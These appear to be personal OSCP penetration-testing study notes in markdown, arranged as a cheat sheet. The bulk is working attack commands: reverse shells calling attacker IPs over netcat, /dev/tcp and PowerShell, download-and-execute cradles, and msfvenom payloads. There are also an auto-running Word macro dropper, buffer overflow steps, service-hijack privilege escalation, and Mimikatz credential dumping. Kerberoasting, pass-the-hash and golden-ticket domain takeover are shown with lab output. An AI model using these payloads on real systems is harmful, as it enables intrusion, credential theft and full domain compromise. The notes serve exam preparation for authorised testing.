# OSCP Notes

## Bind shell vs reverse shell

### Bind shell

Basically, we are opening a port with our shell for other people to execute
- Client computer starts up a listening session with shell executing on that port
- Connector just connects to the listening port that has shell already running

### Reverse shell

Basically, we are sending our own shell over to the operator
- Operator listens on a port
- Client computer connects to the listening port on the operator with the client's own shell
- Operator now has control of clients shell

#### Netcat reverse shell
```sh
nc <listening_host> <listening_port> -e /bin/bash
```

#### TCP revsrse shell
```sh
/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
```

#### Powercat reverse shell example

```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"
```

#### Powershell reverse shell

```sh
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.194',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
## Buffer overflows

1. Search for buffer overflow vunlerability by determining at what length does the program crash
2. Search for where instruction pointer is overwritten by generating non-repeating payload then finding the offset at which `eip` is overwritten
3. Find the bad characters by using all the possible hex values and looking at the stack to see which characters didn't make it through
4. Find which register points to somewhere in the stack where we can write to
5. Find an instruction that jumps to the register ie. `jmp esp`
6. Get that instructions address and overwrite `eip` with that
7. Use the register's location and put our shell code there

### Create pattern

```sh
msf-pattern_create -l <length>
```

### Pattern offset finder

```sh
msf-pattern_offset -q <pattern_found>
```

### Generate assembly instruction opcodes

```sh
msf-nasm_shell
nasm > add eax,12
00000000  83C00C            add eax,byte +0xc
```

### Mona finding jmp esp

```sh
!mona jmp -r esp
# click view > log or press alt + L
```

or 
```sh
!mona find -s '\xff\xe4'
```

### Bad characters

**Be aware that if a buffer overflow is strict on length, then some bad characters that don't make it through will result in the buffer overflow crash not being triggered.**

The following is missing `\x00,\x1A,\x1D`
```python
badchars = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

### Windows reverse tcp shells

#### Shikata ga nai
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<listening_host> LPORT=<listening_port> EXITFUNC=thread -f c -e x86/shikata_ga_nai -b <illegal characters as string ie. "\x00\x12...">
```

#### Fnstenv mov

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<listening host> LPORT=<listening port> -f c -e x86/fnstenv_mov -b "\x00\x0a\x0d\xff\x3b\x45..."
```

### Linux reverse tcp shells

```sh
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.194 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b <illegal characters as string ie. "\x00\x12...">
```

## Leveraging HTML applications

### msfvenom hta payload

```sh
sudo msfvenom -p windows/shell_reverse_tcp LHOST=<listening_host> LPORT=<listening_port> -f hta-psh -o evil.hta 
```

Next, serve the file on port 80

```sh
sudo python -m SimpleHTTPServer 80
```


## FIle transfer

### Linux to Windows:

**IF USING FTP TRANFERRING BINARIES, REMEMBER TO USE FTP BINARY MODE FIRST**
#### Powershell
In powershell:
```powershell
$client = new-object System.Net.WebClient
$client.DownloadFile("http://192.168.119.194/tmp.txt","C:\tmp\file.txt")
```

One line form:
```powershell
(new-object System.Net.WebClient).DownloadFile('http://www.xyz.net/file.txt','C:\tmp\file.txt')
```

##### Executing code in memory 
```powershell
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"
```

### Windows to linux

Create a python server and get it from the linux machine:

On windows:
```cmd
python -m SimpleHTTPServer 80
```
On linux:
```sh
wget http://<windows-machine-ip>/<file-name>
```
#### Netcat

In command prompt:
```powershell
C:\tools\practical_tools\nc.exe -nvlp 4455 > C:\Users\offset\Desktop\binary.exe
```

In linux machine:

```sh
nc -w <windows_ip_here> 4455 < binary.exe
```

### Linux to linux

#### Wget

```sh
wget 192.168.1.102:9999/file.txt
```

#### Curl

```sh
curl -O http://192.168.0.101/file.txt
```
## Interactive shells

### Semi-interactive
Getting a semi-interactive shells is simple:

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Fully interactive shell

First, run the semi-interactive shell python command, then background the current shell process, run `stty raw -echo` in the terminal which will pass keyboard shortcuts through, then run `fg` to bring netcat back.

## Msfvenom

### Windows exe staged_payload (needs metasploit to catch, **allowed on exam**)

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=5555 -f exe > binary.exe
```

### Powershell

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.194 LPORT=5555 -f powershell
```

### Combining payloads

```sh
nasm -f bin eternalblue_x64_kshellcode.asm -o sc_x64_kernel.bin
msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin LHOST=192.168.254.142 LPORT=4444
cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
```


## Windows tips & tricks

### Changing execution policy

```sh
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
Get-ExecutionPolicy -Scope CurrentUser
```

## Microsoft-word macro payload

First create an `evil.hta` file like so:

```sh
# recommended
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.194 LPORT=80 -f vba-psh > payload.txt
# or
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta 
```

Next create a new macro and copy-paste the file into the macro

Finally create a word macro and past the shell code in like so:

```vbscript
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
    Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
    Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
    Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"
    Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"
    Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"
    ...
    Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"
    Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"
    Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"
    Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"   
    Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
    Str = Str + "QA=" 
    
    CreateObject("Wscript.Shell").Run Str 
End Sub
```

Now save the file as either a `docm` file type or a `doc` (older) file type 

**ALTERNATIVELY**

we can use powershell empire

```sh
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host 192.168.119.194
(Empire: listeners/http) > set Name exploit
(Empire: listeners/http) > execute
[*] Starting listener 'exploit'
 * Serving Flask app "http" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
[+] Listener successfully started!
(Empire: listeners/http) > back
(Empire: listeners) > usestager windows/macro
(Empire: stager/windows/macro) > listeners

[*] Active listeners:

  Name              Module          Host                                 Delay/Jitter   KillDate
  ----              ------          ----                                 ------------   --------
  exploit           http            http://192.168.119.194:80            5/0.0                  

(Empire: stager/windows/macro) > set Listener exploit
(Empire: stager/windows/macro) > execute

[*] Stager output written out to: /tmp/macro
```

Check if macro was embedded using `olevba word_macro.doc from [oletools](https://github.com/decalage2/oletools)

## Metasploit framework

### Windows reverse meterpreter shell

```sh
msfconsole -x "use exploit/multi/handler"; set RHOST 192.168.194.10; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.194; set LPORT 5555;
```

or

```sh
sudo msfconsole
> use exploit/multi/handler
> set PAYLOAD windows/meterpreter/reverse_tcp
> set LHOST 192.168.119.194
> set LPORT 5555
> run
```

## Device enumeration

### Useful commands for windows clients:
- View user info: `net user`
- View system info: `systeminfo`
- View routing information: `route print`
- View running services: `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
- View active network connections: `netstat -ano`
- View current firewall profile: `netsh advfirewall show currentprofile`
    - View all firewall rules: `netsh advfirewall show rule name=all`
- View scheduled tasks: `schtasks /query /fo LIST /v`
- View all installed application with version: `wmic product get name, version, vendor`
    - View system wide updates: `wmic qfe Caption, Description, HotFixID, InstalledOn`
- View any file that can be modified by anyone using **powershell**: `Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}`
- List all drives that are mounted and non-mounted: `mountvol`
- Gather kernel information in **powershell**: `driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Node', Path`
- Gather driver versions ie. vmware: `Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*Vmware*"}`
- Checking if we can run any windows installer with elevated priviledges: 
    - `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`
    - `reg query HKEY_CURRENT_MACHINE\Software\Policies\Microsoft\Windows\Installer`


### For linux client, commands that can be used:
- View all processes: `ps axu`
- Check all TCP/IP configurations: `ip a`
- Display network routing table: `/sbin/route`
- Display active network connections: `ss -anp`
- View scheduled tasks: `ls -lah /etc/cron*`
    - Crontab: `cat /etc/crontab`
- Listing installed packages: `dpkg -l`
- Find all directories writable by current user: `find / -writable -type d 2>/dev/null`
- List all mounted file systems: `mount`
    - static file system: `cat /etc/fstab` 
    - All available disks: `/bin/lsblk`
- Loaded kernel modules: `lsmod`
    - Find out more about module: `/sbin/modinfo <module_name>`
- Find any binaries that can be run as root: `find / -perm -u=s -type f 2>/dev/null`

## Privilege escalation (Priv esc)

### Windows

- Starting powershell in high-integrity mode: `powershell Start-Process cmd.exe -Verb runAs`
- A lot of windows binaries can be found at `/usr/share/windows-binaries/` for kali linux
#### Sherlock

- Can use sherlock to find priv esc possiblities

#### Finding system info
```sh
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
hostname
echo %username%
net users
```

#### Powerup

```powershell
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.194/PowerUp.ps1'); Invoke-AllChecks
# Powerup original url: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
```

#### Windows Exploit Suggester

```sh
windows-exploit-suggester --database 2020-05-20-mssb.xls --systeminfo systeminfo.txt
```

#### JuicyPotato

RottenPotatoNG and its variants leverages the privilege escalation chain based on BITS service having the MiTM listener on `127.0.0.1:6666` and when you have SeImpersonate or SeAssignPrimaryToken privileges. During a Windows build review we found a setup where BITS was intentionally disabled and port `6666` was taken. Neds to have `SeImpersonatePrivilege` enabled:

```powershell
c:\Users\Public\Documents>whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

- [Juicy-Potato-description](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato)
- [Juicy-Potato release](https://github.com/ohpe/juicy-potato/releases)

##### Usage
We will need `CLSID`'s to use for the scrip. Either by running the script [Get-CLSID.ps1](https://ohpe.it/juicy-potato/CLSID/GetCLSID.ps1) or by finding the corresponding one inside this [list](https://ohpe.it/juicy-potato/CLSID/) and use psexec to change to a service account: [pstools](https://download.sysinternals.com/files/PSTools.zip)

```powershell
JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
# or 
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

#### Windows Services

##### sc.exe

```cmd
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt

FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt

FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt

FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```

`cacls "C:\path\to\file.exe"`

we want to look for `BUITIN/users:(F)` or when our user/usergroup has `(F)` or `(C)` rights.

then we can just replace that exe with our own malicious exe and rerun the service:

`net stop [service name] && net start [service name].`

###### Example

```sh
sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.119.194 443 -e c:\Windows\system32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost depend= ""
sc qc upnphost
net start upnphost
```

##### Microsoft systems internal suite

This system's internal suite: [Link](https://download.sysinternals.com/files/SysinternalsSuite.zip) contains a variety of scripts that can be used to check user privileges.

Now we can use the following: 

```sh
C:\Inetpub>accesschk.exe -uwcqv "Authenticated Users" *
C:\> accesschk.exe -uwcqv "Authenticated Users" *
C:\> accesschk.exe -ucqv SSDPSRV
C:\> accesschk.exe -ucqv upnphost
```

This guide is useful: https://www.fuzzysecurity.com/tutorials/16.html
### Linux

Can use linux priv esc checker.

## Port forwarding

### Remote port forwarding

Traffic sent to victim port will be sent to our port instead. This can be used to bypass firewalls.

First, on victim machine:

```sh
ssh -N -R <our_ip>:<our_port_number>:127.0.0.1:<port_to_forward> <our_username>@<our_ip>
```

Then on our machine to verify:

```sh
ss -antp | grep "<out_port_number>"
```

## Active Directory

```powershell
[System.DirecrotyServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

### Get all Service Principal Names (SPN's)

```powershell
cls
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(servicePrincipalName=*)"

## You can use this to filter for OU's:
## $results = $search.Findall() | ?{ $_.path -like '*OU=whatever,DC=whatever,DC=whatever*' }
$results = $search.Findall()

foreach( $result in $results ) {
	$userEntry = $result.GetDirectoryEntry()
	Write-host "Object Name = " $userEntry.name -backgroundcolor "yellow" -foregroundcolor "black"
	Write-host "DN      =      "  $userEntry.distinguishedName
	Write-host "Object Cat. = "  $userEntry.objectCategory
	Write-host "servicePrincipalNames"

	$i=1
	foreach( $SPN in $userEntry.servicePrincipalName ) {
		Write-host "SPN(" $i ")   =      " $SPN
		$i+=1
	}
	Write-host ""
}
```


### Mimikatz

#### Password Hashes

To get password hashes on windows, we can use [mimikatz](https://github.com/gentilkiwi/mimikatz)

Then in mimikats:

```sh
c:\Tools\active_directory>mimikatz.exe

  .#####.   mimikatz 2.1.1 (x86) built on Mar 25 2018 21:00:57
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
```

or

```sh
sekurlsa::minidump C:\Users\%USERNAME%\Documents\lsass.DMP
```

#### Tickets [Ticket Granting Ticket / Ticket Granting Service]

TGT can request for TGS for resources wanted in domain

```sh
sekurlsa::tickets
```

### Display kerberos service ticket

```powershell
PS C:\Windows\system32> Add-Type -AssemblyName System.IdentityModel
PS C:\Windows\system32> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWe
bServer.corp.com'

Id                   : uuid-393f01fe-efad-46c9-a875-8ddc9eb96828-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 5/29/2020 8:30:02 PM
ValidTo              : 5/30/2020 6:26:32 AM
ServicePrincipalName : HTTP/CorpWebServer.corp.com
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

# can alternatively use klist command 
PS C:\Windows\system32> klist

# or inside mimikatz to export into files to be downloaded to attack machine:
mimikatz # kerberos::list /export

# Or use Invoke-kerberoast
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat john | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')}
```

Now to crack service tickets to find clear-text passwords for service accounts

```sh
~/kerberoast(master*) » python3 tgsrepcrack.py rockyou-20.txt ~/OSCP-excercises/1-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi                              omar2535@kali


USE HASHCAT, IT'S HELLA FASTER!!


Cracking 1 tickets...
found password for ticket 0: Qwerty09!  File: /home/omar2535/OSCP-excercises/1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
Successfully cracked all tickets
```

### Pass the Hash

Once the NTLM hash is retrieved, we can construct a pass the hash attack to elevate our priveleges using NTLM authentication.
For example, if our NTLM hash was `2892d26cdf84d7a70e2eb3b9f05c425e`, then our command to pass the hash would be 
```sh
# the following command will launch a rdesktop with that user's hash
# the aad3b435b51404eeaad3b435b51404ee part after the userid means "no password"
pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.194.10 cmd 

E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.16299.15]
(c) 2017 Microsoft Corporation. All rights reserved.
C:\Windows\system32>
```

### Overpass the hash

We can bypass NTLM authentication and get a TGT by passing the hash within mimikats like so:

```sh
mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:PowerShell.exe
```

and a powershell is spawned. To check our kerberos tickets:

```powershell
> klist
```

Now we can log into the domain controller using psexec like so:

```powershell
PS C:\Tools\active_directory> .\PsExec.exe \\dc01 cmd.exe
```

### Creating a silver ticket to authenticate with

First find the SID:

```powershell
PS C:\Tools\active_directory> whoami /user

USER INFORMATION
----------------

User Name   SID
=========== ==============================================
corp\offsec S-1-5-21-4038953314-3014849035-1274281563-1103
PS C:\Tools\active_directory> .\mimikatz.exe
```

Now purge all existing tickets
```powershell
mimikatz # kerberos::purge
mimikatz # kerberos::list
```

Now create the new ticket with the sid's last portion cut off and the rc4 from the NTLM hash

```powershell
mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpWebServer.corp.com /service:HTTP /rc4:2892d26cdf84d7a70e2eb3b9f05c425e /ptt
```

### Distributed Component Object model (Pivoting)

We can launch applications on another computer from a workstation with microsoft office installed.

First let's view the available methods and find if the `run` method is available.

Ip addresss of remote workstation: 172.16.194.5

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application","172.16.194.5"))
$com | Get-Member
```

Now create the excel macro 

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.194.10 LPORT=5555 -f vba-psh > new_payload.txt
cat new_payload.txt
```
copy it to the remote computer
```powershell
$LocalPath = "C:\Users\jeff_admin\Documents\myexcel.xls"
$RemotePath = "\\172.16.194.5\c$\myexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
```

Now open the excel file from our machine by creating a system profile on the remote machine then running it

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application","172.16.194.5"))

$Path = "\\172.16.194.5\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\myexcel.xls")

$com.Run("mymacro")
$com.Run("Workbook_Open")
$com.Run("mOaoZH8")
$com.Run("AutoOpen")
```

### Creating a golden ticket to psexec on domain controller

Go into the domain controller and grab the NTLM hash

```powershell
# On the domain controller:
C:\Tools>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 May 13 2019 01:35:04
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : fc274a94b36874d2560a7bd332604fab
```

Now on the workstation:

Find the SID first using `whoami /user` without the last part after the `-`.
```powershell
C:\Tools>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 May 13 2019 01:35:04
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /krbtgt:fc274a94b36874d2560a7bd332604fab /ptt
```

Now we can launch a command prompt on the domain controller using `psexec` like so:

```cmd
C:\Windows\system32>cd C:\Tools\active_directory

C:\Tools\active_directory>PsExec.exe \\dc01 cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
corp\fakeuser
```

## Password cracking

### Hash identifier

```sh
hash-identifier AAFDC23870ECBCD3D557B6423A8982134E17927E
```
